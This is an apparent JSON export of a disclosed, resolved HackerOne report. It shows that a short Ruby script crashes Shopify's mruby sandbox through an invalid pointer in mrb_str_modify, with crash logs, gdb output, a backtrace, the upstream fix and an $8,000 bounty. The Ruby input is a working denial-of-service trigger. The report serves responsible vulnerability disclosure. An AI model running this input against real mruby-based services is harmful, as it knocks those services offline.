{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2016-12-17T02:30:01.509Z", 
    "voters": [
        "eveeez", 
        "mpz", 
        "spetr0x", 
        "janhacker", 
        "hackerjuan"
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "8000.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 183231, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2016-12-16T19:57:14.576Z", 
    "vulnerability_information": "There is an invalid memory read on mruby when calling to `mrb_str_modify()` with a invalid `RString *` which causes a SIGSEGV and leads to denial of service.\n\n## Sample\n\nThe following code triggers the bug (attached as mrb_str_modify.min.rb):\n```ruby\ndef n\nif $0\nend\n\"\"if 00end\nqqq=Proc.new{|*x|x.join}\nqqq.(\"\",<<000,\"\",\n000\n\"\")\nqqq.(\"\",\"#{<<000}\",\n000\n\"\")\n0[<<0000,\n#{<<0000}\n0000\n0000\n0]\n```\n\n## Crash\nHere we can see the crash (full crash output attached)\n```\n$ bin/sandbox /tmp/mrb_str_modify.min.rb\nbin/sandbox:21: [BUG] Segmentation fault at 0x00000000000001\nruby 2.3.1p112 (2016-04-26) [x86_64-linux-gnu]\n\n-- Control frame information -----------------------------------------------\nc:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval\nc:0002 p:0201 s:0005 E:000518 EVAL   bin/sandbox:21 [FINISH]\nc:0001 p:0000 s:0002 E:000730 (none) [FINISH]\n\n-- Ruby level backtrace information ----------------------------------------\nbin/sandbox:21:in `<main>'\nbin/sandbox:21:in `sandbox_eval'\n\n-- Machine register context ------------------------------------------------\n RIP: 0x00007f423c11d17b RBP: 0x00007f423ac954e0 RSP: 0x00007f423ac93a80\n RAX: 0x0000000000000002 RBX: 0x0000000000000001 RCX: 0x00007f423aca7b00\n RDX: 0x00007f423ac9cf80 RDI: 0x00007f423ac954e0 RSI: 0x0000000000000001\n  R8: 0x00007f423ac953e0  R9: 0x00007f423acbc6a0 R10: 0x0000000000000330\n R11: 0x00007f423c11e670 R12: 0x00007f423ac954e0 R13: 0x00007f423ac9cf80\n R14: 0x00007f423ac954e0 R15: 0x000000000100c03e EFL: 0x0000000000010202\n\n-- C level backtrace information -------------------------------------------\n/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f424042dea5]\n/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f424042e0dc]\n/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f4240308364]\n/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f42403b9dbe]\n/lib/x86_64-linux-gnu/libpthread.so.0 [0x7f424008ced0]\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_str_modify+0xb) [0x7f423c11d17b] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:659\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_str_concat+0x18) [0x7f423c11e688] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:758\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_exec+0x2243) [0x7f423c12e7d3] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:2219\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_run+0x57) [0x7f423c132567] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mruby_engine_monitored_eval+0x113) [0x7f423c106173] ../../../../ext/mruby_engine/eval_monitored.c:68\n/lib/x86_64-linux-gnu/libpthread.so.0 [0x7f4240083464]\n/lib/x86_64-linux-gnu/libc.so.6(__clone+0x6d) [0x7f423f3ff30d]\n```\n\n\n## Crash debug\n\n```\n(gdb) r\nStarting program: /usr/bin/ruby /home/jaime/research/shopy/mruby-engine/bin/sandbox /tmp/mrb_str_modify.min.rb\n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\n[New Thread 0x7ffff7ff5700 (LWP 30942)]\n[New Thread 0x7ffff2348700 (LWP 30993)]\n\nProgram received signal SIGSEGV, Segmentation fault.\n[Switching to Thread 0x7ffff2348700 (LWP 30993)]\nmrb_str_modify (mrb=mrb@entry=0x7ffff23494e0, s=s@entry=0x1) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:660\n660       check_frozen(mrb, s);\n(gdb) x/1i $rip\n=> 0x7ffff37d117b <mrb_str_modify+11>:  mov    eax,DWORD PTR [rsi]\n(gdb) i r rsi\nrsi            0x1      1\n(gdb) print (mrb_value)$rsi\n$1 = {\n  value = {\n    p = 0x1,\n    {\n      i_flag = 1,\n      i = 0\n    },\n    {\n      sym_flag = 1,\n      sym = 0\n    },\n    bp = 0x1,\n    fp = 0x1,\n    vp = 0x1\n  },\n  w = 1\n}\n(gdb) list *$rip\n0x7ffff37d117b is in mrb_str_modify (/home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:504).\n499     }\n500\n501     static void\n502     check_frozen(mrb_state *mrb, struct RString *s)\n503     {\n504       if (RSTR_FROZEN_P(s)) {\n505         mrb_raise(mrb, E_RUNTIME_ERROR, \"can't modify frozen string\");\n506       }\n507     }\n508\n(gdb)\n```\n\nBacktrace\n```\n(gdb) bt\n#0  mrb_str_modify (mrb=mrb@entry=0x7ffff23494e0, s=s@entry=0x1) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:660\n#1  0x00007ffff37d2688 in mrb_str_concat (mrb=mrb@entry=0x7ffff23494e0, self=..., other=...) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:758\n#2  0x00007ffff37e27d3 in mrb_vm_exec (mrb=mrb@entry=0x7ffff23494e0, proc=<optimized out>, proc@entry=0x7ffff2351310, pc=<optimized out>) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:2219\n#3  0x00007ffff37e6567 in mrb_vm_run (mrb=0x7ffff23494e0, proc=0x7ffff2351310, self=..., stack_keep=stack_keep@entry=0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n#4  0x00007ffff37ba173 in mruby_engine_monitored_eval (data=0x7ffff23493e0) at ../../../../ext/mruby_engine/eval_monitored.c:68\n#5  0x00007ffff7737464 in start_thread (arg=0x7ffff2348700) at pthread_create.c:333\n#6  0x00007ffff6ab330d in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:109\n```\n\nThe crash happens at `mruby-engine/ext/mruby_engine/mruby/src/string.c:504` which is built inline\n```c\nstatic void\ncheck_frozen(mrb_state *mrb, struct RString *s)\n{\n  if (RSTR_FROZEN_P(s)) {   // <-- Bug happens here\n    mrb_raise(mrb, E_RUNTIME_ERROR, \"can't modify frozen string\");\n  }\n}\n```\n\nActually `mrb_str_concat()` performs a cast of the argument `mrb_value self` to a `RString *` pointer, this generates an invalid pointer which is passed to `mrb_str_modify()` and later on to `check_frozen()` which tries to read from it and produces the crash.\n\n## Impact\nIts impact seems to be DoS of the service running the sandbox service. I doubt this would be exploitable, but I have seen the memory address being read change in between samples. If an attacker would be able to control this value it could lead to a write-what-where type vulnerability. But I highly doubt this would be possible to control.\n\nSamples generating different invalid addresses have been attached.\n```\n$ bin/sandbox /tmp/mrb_str_modify.rb 2>&1 | head -1\nbin/sandbox:21: [BUG] Segmentation fault at 0x00000000000003\n$ bin/sandbox /tmp/mrb_str_modify.min.rb 2>&1 | head -1\nbin/sandbox:21: [BUG] Segmentation fault at 0x00000000000001\n```", 
    "activity_page_count": 1, 
    "severity": {
        "rating": "high", 
        "author_type": "Team"
    }, 
    "title": "SIGSEGV on mruby mrb_str_modify() (Invalid memory access)", 
    "is_member_of_team?": null, 
    "vote_count": 5, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2017-01-15T19:57:14.607Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "activity_page_number": 1, 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$8,000", 
    "attachments": [
        {
            "file_name": "mrb_str_modify.min.rb", 
            "type": "text/plain", 
            "id": 135301, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/135/301/426e99bb149abb3c39e3ae8b57cf8615a985dc91/mrb_str_modify.min.rb?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2G5YP65E%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224543Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDBU1F5krpICaZ0NqsCK3A6VE3SvOEqtR6mTF0RGsq2RFtP%2BeCnscHc5QWUWgfaEy6uXh0YyE%2Bu%2FBf1bgQOuQySCtb1Z%2BZ6sLON3HRMq%2BgYmhgdN4si0rU1p4nOiBj6crMBDlPKrwCFw0SRWaa%2FeWJtScRo9HMxA318TQuy1cnz2RYUYCxaU0Jci%2BrDGNmR0becuinzwZxwbm9sdysqqkTqFq64D7gI7nTrej5s6rDW11vFWqHpUP2d1FhvBaFOAjy8GP523rvRQSSyFkXe9YJUVlNrSLtqEAenEAnsweq3B3e669G9C%2FHm8G06ThADW69XI9pnMKVDT3FsJRtvkiltR9fsPJGB94knGZqwwdAK33UZ6TzU7QFoNEMoH%2BuvrEkO7SW8nmlfngtoX7AqMEGVMNAktUrQgR3jBfz1AXbDyaVpNINObIwvcxkjAPeH%2BJ9fJANeefQc2S9wtnpHnZGI8bjrMu%2F%2BBZHNLud7642CzhDwWVt363%2B%2B45PABKA6apczYhBSmM6I6woOQCnxMCpcKiqGyhztmN1LCRqv7FY5wPxjrGQArJvuYDfVGrN5Q7QMy6qocAzCdmYXfTag83vWxBpO15sjYooKOm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ed43b4bff9480ccd3d2823f2caae39561c45058c2b6bf77ba95cba6198846458"
        }, 
        {
            "file_name": "mrb_str_modify.rb", 
            "type": "application/octet-stream", 
            "id": 135302, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/135/302/e13bada5b99bb47127ce9674abc6822babbf62d8/mrb_str_modify.rb?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2G5YP65E%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224543Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDBU1F5krpICaZ0NqsCK3A6VE3SvOEqtR6mTF0RGsq2RFtP%2BeCnscHc5QWUWgfaEy6uXh0YyE%2Bu%2FBf1bgQOuQySCtb1Z%2BZ6sLON3HRMq%2BgYmhgdN4si0rU1p4nOiBj6crMBDlPKrwCFw0SRWaa%2FeWJtScRo9HMxA318TQuy1cnz2RYUYCxaU0Jci%2BrDGNmR0becuinzwZxwbm9sdysqqkTqFq64D7gI7nTrej5s6rDW11vFWqHpUP2d1FhvBaFOAjy8GP523rvRQSSyFkXe9YJUVlNrSLtqEAenEAnsweq3B3e669G9C%2FHm8G06ThADW69XI9pnMKVDT3FsJRtvkiltR9fsPJGB94knGZqwwdAK33UZ6TzU7QFoNEMoH%2BuvrEkO7SW8nmlfngtoX7AqMEGVMNAktUrQgR3jBfz1AXbDyaVpNINObIwvcxkjAPeH%2BJ9fJANeefQc2S9wtnpHnZGI8bjrMu%2F%2BBZHNLud7642CzhDwWVt363%2B%2B45PABKA6apczYhBSmM6I6woOQCnxMCpcKiqGyhztmN1LCRqv7FY5wPxjrGQArJvuYDfVGrN5Q7QMy6qocAzCdmYXfTag83vWxBpO15sjYooKOm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=aef09747cecb46e165f503b80116acc5d6e2b5c7a32ea43f7e8f1f7fb1ebff96"
        }, 
        {
            "file_name": "mrb_str_modify.crash.log", 
            "type": "text/plain", 
            "id": 135304, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/135/304/227543e55a0f26a079b00e9477a3b16a8e78e206/mrb_str_modify.crash.log?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2G5YP65E%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224543Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDBU1F5krpICaZ0NqsCK3A6VE3SvOEqtR6mTF0RGsq2RFtP%2BeCnscHc5QWUWgfaEy6uXh0YyE%2Bu%2FBf1bgQOuQySCtb1Z%2BZ6sLON3HRMq%2BgYmhgdN4si0rU1p4nOiBj6crMBDlPKrwCFw0SRWaa%2FeWJtScRo9HMxA318TQuy1cnz2RYUYCxaU0Jci%2BrDGNmR0becuinzwZxwbm9sdysqqkTqFq64D7gI7nTrej5s6rDW11vFWqHpUP2d1FhvBaFOAjy8GP523rvRQSSyFkXe9YJUVlNrSLtqEAenEAnsweq3B3e669G9C%2FHm8G06ThADW69XI9pnMKVDT3FsJRtvkiltR9fsPJGB94knGZqwwdAK33UZ6TzU7QFoNEMoH%2BuvrEkO7SW8nmlfngtoX7AqMEGVMNAktUrQgR3jBfz1AXbDyaVpNINObIwvcxkjAPeH%2BJ9fJANeefQc2S9wtnpHnZGI8bjrMu%2F%2BBZHNLud7642CzhDwWVt363%2B%2B45PABKA6apczYhBSmM6I6woOQCnxMCpcKiqGyhztmN1LCRqv7FY5wPxjrGQArJvuYDfVGrN5Q7QMy6qocAzCdmYXfTag83vWxBpO15sjYooKOm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d1eb2e526ef0959255814357c610f4bc7178371bfb0cd03c855a18f1f9ff19fc"
        }
    ], 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2016-11-18T13:01:24.346Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-11-18T13:01:24.346Z", 
            "actor": {
                "username": "clayton", 
                "url": "/clayton", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/166/6d366b567e9fef1c476c1505c0016e3031a74a34_medium.jpg?1493127129"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify-scripts", 
            "message": "Thank you for your report. We've reproduced the issue, and our engineering team is investigating.", 
            "markdown_message": "<p>Thank you for your report. We&#39;ve reproduced the issue, and our engineering team is investigating.</p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 1306660, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-11-18T13:01:31.001Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-11-18T13:01:31.001Z", 
            "actor": {
                "username": "clayton", 
                "url": "/clayton", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/166/6d366b567e9fef1c476c1505c0016e3031a74a34_medium.jpg?1493127129"
                }, 
                "hackerone_triager": false
            }, 
            "additional_data": {
                "new_severity": "High", 
                "old_severity": null
            }, 
            "team_handle": "shopify-scripts", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportSeverityUpdated", 
            "id": 1306661, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "jpenalbae", 
                "url": "/jpenalbae"
            }, 
            "created_at": "2016-11-22T21:17:17.753Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-11-22T21:17:17.753Z", 
            "actor": {
                "username": "clayton", 
                "url": "/clayton", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/166/6d366b567e9fef1c476c1505c0016e3031a74a34_medium.jpg?1493127129"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify-scripts", 
            "message": "Hi @jpenalbae,\n\nThanks again for the report. We recently deployed a fix to our production environment.\n\nI'm marking this issue as resolved now but we still need to fix this bug upstream before we can assess the impact & determine a final bounty amount. This may take a few weeks since we received a large number of valid issues and we want to calibrate our payouts across all of them.", 
            "markdown_message": "<p>Hi <a href=\"/jpenalbae\">@jpenalbae</a>,</p>\n\n<p>Thanks again for the report. We recently deployed a fix to our production environment.</p>\n\n<p>I&#39;m marking this issue as resolved now but we still need to fix this bug upstream before we can assess the impact &amp; determine a final bounty amount. This may take a few weeks since we received a large number of valid issues and we want to calibrate our payouts across all of them.</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 1313791, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-11-25T15:54:34.809Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-11-25T15:54:34.809Z", 
            "actor": {
                "username": "francoischagnon", 
                "url": "/francoischagnon", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/168/3b5130025fbf90eaeb1c9234baa340dfead68f44_medium.jpg?1429126005"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify-scripts", 
            "message": "The fix for this has been merged upstream: https://github.com/mruby/mruby/pull/3279/files", 
            "markdown_message": "<p>The fix for this has been merged upstream: <a title=\"https://github.com/mruby/mruby/pull/3279/files\" href=\"/redirect?signature=6239e0cff049b301f1f38f70465f7fb90717f914&amp;url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fpull%2F3279%2Ffiles\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/mruby/mruby/pull/3279/files</span><i class=\"icon-external-link\"></i></a></p>\n", 
            "type": "Activities::Comment", 
            "id": 1319239, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2016-12-16T19:57:08.352Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-12-16T19:57:08.352Z", 
            "actor": {
                "url": "/shopify-scripts", 
                "profile": {
                    "name": "shopify-scripts"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/668/b50db49e93f656e202ae6f94b4c0821d1184134b_medium.jpg?1475592254"
                }
            }, 
            "team_handle": "shopify-scripts", 
            "bounty_amount": "8000.0", 
            "collaborator": {
                "username": "jpenalbae", 
                "url": "/jpenalbae"
            }, 
            "message": "Thanks for helping improve the security of Shopify Scripts and the mruby project!", 
            "markdown_message": "<p>Thanks for helping improve the security of Shopify Scripts and the mruby project!</p>\n", 
            "type": "Activities::BountyAwarded", 
            "id": 1370057, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-12-16T19:57:14.594Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-12-16T19:57:14.594Z", 
            "actor": {
                "username": "andrewdunbar", 
                "url": "/andrewdunbar", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/164/cd46f5270ea41c5f0da3bea93e2eca7a95858caf_medium.jpg?1427927985"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify-scripts", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1370058, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-12-17T02:30:01.937Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-12-17T02:30:01.937Z", 
            "actor": {
                "username": "jpenalbae", 
                "url": "/jpenalbae", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify-scripts", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1370763, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-12-17T02:30:02.009Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-12-17T02:30:02.009Z", 
            "actor": {
                "username": "jpenalbae", 
                "url": "/jpenalbae", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify-scripts", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1370764, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "jpenalbae", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/jpenalbae", 
        "profile_picture_urls": {
            "small": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 48, 
        "name": "Denial of Service"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -59626108.735320285, 
    "disclosed_at": "2016-12-17T02:30:01.984Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/183231", 
    "created_at": "2016-11-18T03:48:21.522Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>There is an invalid memory read on mruby when calling to <code>mrb_str_modify()</code> with a invalid <code>RString *</code> which causes a SIGSEGV and leads to denial of service.</p>\n\n<h2 id=\"sample\">Sample</h2>\n\n<p>The following code triggers the bug (attached as mrb_str_modify.min.rb):</p>\n<pre class=\"highlight ruby\"><code><span class=\"k\">def</span> <span class=\"nf\">n</span>\n<span class=\"k\">if</span> <span class=\"vg\">$0</span>\n<span class=\"k\">end</span>\n<span class=\"s2\">&quot;&quot;</span><span class=\"k\">if</span> <span class=\"mo\">00</span><span class=\"k\">end</span>\n<span class=\"n\">qqq</span><span class=\"o\">=</span><span class=\"no\">Proc</span><span class=\"p\">.</span><span class=\"nf\">new</span><span class=\"p\">{</span><span class=\"o\">|*</span><span class=\"n\">x</span><span class=\"o\">|</span><span class=\"n\">x</span><span class=\"p\">.</span><span class=\"nf\">join</span><span class=\"p\">}</span>\n<span class=\"n\">qqq</span><span class=\"o\">.</span><span class=\"p\">(</span><span class=\"s2\">&quot;&quot;</span><span class=\"p\">,</span><span class=\"o\">&lt;&lt;</span><span class=\"mo\">000</span><span class=\"p\">,</span><span class=\"s2\">&quot;&quot;</span><span class=\"p\">,</span>\n<span class=\"mo\">000</span>\n<span class=\"s2\">&quot;&quot;</span><span class=\"p\">)</span>\n<span class=\"n\">qqq</span><span class=\"o\">.</span><span class=\"p\">(</span><span class=\"s2\">&quot;&quot;</span><span class=\"p\">,</span><span class=\"s2\">&quot;</span><span class=\"si\">#{</span><span class=\"o\">&lt;&lt;</span><span class=\"mo\">000</span><span class=\"si\">}</span><span class=\"s2\">&quot;</span><span class=\"p\">,</span>\n<span class=\"mo\">000</span>\n<span class=\"s2\">&quot;&quot;</span><span class=\"p\">)</span>\n<span class=\"mi\">0</span><span class=\"p\">[</span><span class=\"o\">&lt;&lt;</span><span class=\"mo\">0000</span><span class=\"p\">,</span>\n<span class=\"c1\">#{&lt;&lt;0000}</span>\n<span class=\"mo\">0000</span>\n<span class=\"mo\">0000</span>\n<span class=\"mi\">0</span><span class=\"p\">]</span>\n</code></pre>\n<h2 id=\"crash\">Crash</h2>\n\n<p>Here we can see the crash (full crash output attached)</p>\n<pre class=\"highlight plaintext\"><code>$ bin/sandbox /tmp/mrb_str_modify.min.rb\nbin/sandbox:21: [BUG] Segmentation fault at 0x00000000000001\nruby 2.3.1p112 (2016-04-26) [x86_64-linux-gnu]\n\n-- Control frame information -----------------------------------------------\nc:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval\nc:0002 p:0201 s:0005 E:000518 EVAL   bin/sandbox:21 [FINISH]\nc:0001 p:0000 s:0002 E:000730 (none) [FINISH]\n\n-- Ruby level backtrace information ----------------------------------------\nbin/sandbox:21:in `&lt;main&gt;&#39;\nbin/sandbox:21:in `sandbox_eval&#39;\n\n-- Machine register context ------------------------------------------------\n RIP: 0x00007f423c11d17b RBP: 0x00007f423ac954e0 RSP: 0x00007f423ac93a80\n RAX: 0x0000000000000002 RBX: 0x0000000000000001 RCX: 0x00007f423aca7b00\n RDX: 0x00007f423ac9cf80 RDI: 0x00007f423ac954e0 RSI: 0x0000000000000001\n  R8: 0x00007f423ac953e0  R9: 0x00007f423acbc6a0 R10: 0x0000000000000330\n R11: 0x00007f423c11e670 R12: 0x00007f423ac954e0 R13: 0x00007f423ac9cf80\n R14: 0x00007f423ac954e0 R15: 0x000000000100c03e EFL: 0x0000000000010202\n\n-- C level backtrace information -------------------------------------------\n/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f424042dea5]\n/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f424042e0dc]\n/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f4240308364]\n/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f42403b9dbe]\n/lib/x86_64-linux-gnu/libpthread.so.0 [0x7f424008ced0]\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_str_modify+0xb) [0x7f423c11d17b] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:659\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_str_concat+0x18) [0x7f423c11e688] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:758\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_exec+0x2243) [0x7f423c12e7d3] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:2219\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_run+0x57) [0x7f423c132567] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mruby_engine_monitored_eval+0x113) [0x7f423c106173] ../../../../ext/mruby_engine/eval_monitored.c:68\n/lib/x86_64-linux-gnu/libpthread.so.0 [0x7f4240083464]\n/lib/x86_64-linux-gnu/libc.so.6(__clone+0x6d) [0x7f423f3ff30d]\n</code></pre>\n<h2 id=\"crash-debug\">Crash debug</h2>\n<pre class=\"highlight plaintext\"><code>(gdb) r\nStarting program: /usr/bin/ruby /home/jaime/research/shopy/mruby-engine/bin/sandbox /tmp/mrb_str_modify.min.rb\n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.\n[New Thread 0x7ffff7ff5700 (LWP 30942)]\n[New Thread 0x7ffff2348700 (LWP 30993)]\n\nProgram received signal SIGSEGV, Segmentation fault.\n[Switching to Thread 0x7ffff2348700 (LWP 30993)]\nmrb_str_modify (mrb=mrb@entry=0x7ffff23494e0, s=s@entry=0x1) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:660\n660       check_frozen(mrb, s);\n(gdb) x/1i $rip\n=&gt; 0x7ffff37d117b &lt;mrb_str_modify+11&gt;:  mov    eax,DWORD PTR [rsi]\n(gdb) i r rsi\nrsi            0x1      1\n(gdb) print (mrb_value)$rsi\n$1 = {\n  value = {\n    p = 0x1,\n    {\n      i_flag = 1,\n      i = 0\n    },\n    {\n      sym_flag = 1,\n      sym = 0\n    },\n    bp = 0x1,\n    fp = 0x1,\n    vp = 0x1\n  },\n  w = 1\n}\n(gdb) list *$rip\n0x7ffff37d117b is in mrb_str_modify (/home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:504).\n499     }\n500\n501     static void\n502     check_frozen(mrb_state *mrb, struct RString *s)\n503     {\n504       if (RSTR_FROZEN_P(s)) {\n505         mrb_raise(mrb, E_RUNTIME_ERROR, &quot;can&#39;t modify frozen string&quot;);\n506       }\n507     }\n508\n(gdb)\n</code></pre>\n<p>Backtrace</p>\n<pre class=\"highlight plaintext\"><code>(gdb) 